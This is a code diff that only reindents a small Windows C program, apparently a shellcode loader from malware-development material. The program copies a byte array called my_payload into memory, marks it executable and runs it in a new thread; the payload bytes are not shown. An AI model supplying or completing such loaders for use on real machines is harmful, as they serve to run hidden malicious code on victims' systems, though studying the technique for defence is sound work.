@@ -37,24 +37,23 @@ unsigned char my_payload[] = {
 unsigned int my_payload_len = sizeof(my_payload);
 
 int main(void) {
-	void * my_payload_mem; // memory buffer for payload
-	BOOL rv;
-	HANDLE th;
+  void * my_payload_mem; // memory buffer for payload
+  BOOL rv;
+  HANDLE th;
   DWORD oldprotect = 0;
 
   // Allocate a memory buffer for payload
-	my_payload_mem = VirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+  my_payload_mem = VirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
   // copy payload to buffer
   RtlMoveMemory(my_payload_mem, my_payload, my_payload_len);
 
   // make new buffer as executable
-	rv = VirtualProtect(my_payload_mem, my_payload_len, PAGE_EXECUTE_READ, &oldprotect);
-	if ( rv != 0 ) {
-
-      // run payload
-			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) my_payload_mem, 0, 0, 0);
-			WaitForSingleObject(th, -1);
-	}
-	return 0;
+  rv = VirtualProtect(my_payload_mem, my_payload_len, PAGE_EXECUTE_READ, &oldprotect);
+  if ( rv != 0 ) {
+    // run payload
+    th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) my_payload_mem, 0, 0, 0);
+    WaitForSingleObject(th, -1);
+  }
+  return 0;
 }
